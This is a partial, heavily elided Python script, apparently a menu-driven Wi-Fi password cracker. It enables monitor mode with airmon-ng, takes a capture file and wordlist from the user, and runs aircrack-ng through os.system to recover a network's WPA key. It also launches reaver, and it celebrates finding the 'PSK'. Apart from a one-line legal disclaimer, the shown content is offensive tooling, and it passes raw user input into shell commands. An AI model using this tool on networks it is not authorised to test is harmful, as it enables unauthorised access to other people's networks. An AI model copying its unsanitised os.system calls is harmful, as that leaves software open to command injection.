...
\033[1;33;48m[info] \033[0;32;48mDeveloped by Sh3llCod3, Using the Aircrack-ng tool. 2017-2020. Use with legal caution, disclaimer applies.Thanks for using this program.\033[0;36;48m                                                                                  
    """)
                ...
                query = str(query)
                os.system("airmon-ng start %s >> log.txt" %(query))
                print("\033[1;34;48m[info] \033[1;37;48m1) Ok, seems like %s is started, time to get crackin'" %(query))
                ...
                b = input("\033[1;33;48m[?] \033[0;33;48mFirst, we'll create a new file to store the key in. What shall I call it? [no spaces]>>")
                b = str(b)
                ...
                if b and c and d != "":
                    ...
                    if e != "" and g != "":
                        ...
                        print("\n\n\033[1;32;48m[+] \033[0;32;48mLOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN SOMEWHERE!")
                        ...
                        print("\033[1;34;48m[info] \033[0;33;48mFirst make sure you have a wordlist which has the password in it ")
                        print("\033[1;34;48m[info] \033[0;35;48mOnce you download or locate one press enter")
                        print("\033[1;34;48m[info] \033[0;34;48mHopefully the password will be in there or put it in there")
                        f = input("\n\033[1;32;48m[+] \033[1;35;48mDrag the wordlist on the terminal, literally!! use the file manager! >>")
                        f = str(f)
                        print("\033[1;34;48m[info] \033[0;34;48mOk, ready? press enter to start cracking")
                        print("\033[1;34;48m[info] \033[0;33;48mIf nothing is found then ctrl+c and try again")
                        input("\033[1;33;48m[press enter]>>")
                        os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
                        print("\n\n\033[1;32;48m[+] \033[0;37;48mLOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN SOMEWHERE!")
                        print("\033[1;32;48m[+] \033[0;37;48mCONGRATS IF YOU FIND THE PSK!")
                        clearScreen()					
                    else:
...
def title():
    try:
        ...
        selection = input("\033[0;35;48mPress 1, 2, 3 or 4 >>")
        if selection == "1":
            aircrackng()
        elif selection == "2":
            reaver()
